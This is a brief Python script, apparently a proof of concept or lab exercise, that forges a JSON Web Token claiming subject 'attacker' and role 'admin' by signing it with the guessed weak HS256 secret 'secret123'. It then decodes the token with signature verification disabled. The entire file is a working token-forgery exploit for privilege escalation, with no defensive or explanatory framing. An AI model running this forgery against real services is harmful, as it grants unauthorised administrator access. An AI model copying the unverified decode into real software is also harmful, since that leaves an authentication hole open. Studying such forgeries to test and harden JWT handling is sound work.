import jwt

payload = {
    "sub": "attacker",
    "role": "admin"
}

forged_token = jwt.encode(
    payload,
    "secret123",
    algorithm="HS256"
)

print("\nFORGED JWT:")
print(forged_token)

print("\nDECODED PAYLOAD:")
print(jwt.decode(
    forged_token,
    options={"verify_signature": False}
))